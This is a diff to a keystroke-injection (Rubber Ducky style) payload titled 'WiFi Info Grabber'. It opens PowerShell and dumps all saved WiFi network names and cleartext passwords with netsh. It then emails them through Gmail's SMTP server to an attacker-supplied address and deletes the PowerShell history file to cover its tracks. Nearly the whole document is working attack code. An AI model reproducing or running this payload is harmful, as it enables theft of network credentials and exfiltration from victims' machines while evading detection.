@@ -2,21 +2,21 @@ REM Title: WiFi Info Grabber
 REM Author: CoolJoe72
 REM Version: 1.5
 REM Description: Grabs WiFi profiles and passwords then emails it to your gmail account.
-ESCAPE
-GUI
+ESC
+CTRL ESC
 DELAY 400
 STRING powershell
 ENTER
 DELAY 400
-REM:::Get Profiles and Passwords:::
+REM :::Get Profiles and Passwords:::
 ENTER
 STRING $A = (netsh wlan show pro) | sls "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show pro "$name" key=clear)}  | sls "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PassWord=$pass }} | ConvertTo-Html -Head "<style>table,th,td{border:1px solid black;}th,td{padding:5px;}table{border-collapse:collapse;}th{background:#ddd;}</style>"
 ENTER
-STRING $hn = hostname
+STRING $S = "WiFi Grabbed from "
 ENTER
-STRING $sub = "WiFi Grabbed from $hn"
+STRING $S += hostname
 ENTER
-REM:::Email WIFI Info::::
+REM :::Email WIFI Info::::
 STRING $SMTPServer = 'smtp.gmail.com'
 ENTER
 STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
@@ -31,16 +31,15 @@ STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
 ENTER
 STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
 ENTER
-STRING $ReportEmail.Subject = $sub
+STRING $ReportEmail.Subject = $S
+ENTER
+STRING $ReportEmail.IsBodyHTML = $true
 ENTER
 STRING $ReportEmail.Body = $A
 ENTER
 STRING $SMTPInfo.Send($ReportEmail)
 ENTER
-STRING $hist = (get-psreadlineoption).historysavepath
+STRING del (get-psreadlineoption).historysavepath
 ENTER
-STRING Get-Content $hist | select-object -skiplast 17 | set-content $hist
-ENTER
-ALT F7
 STRING exit
 ENTER
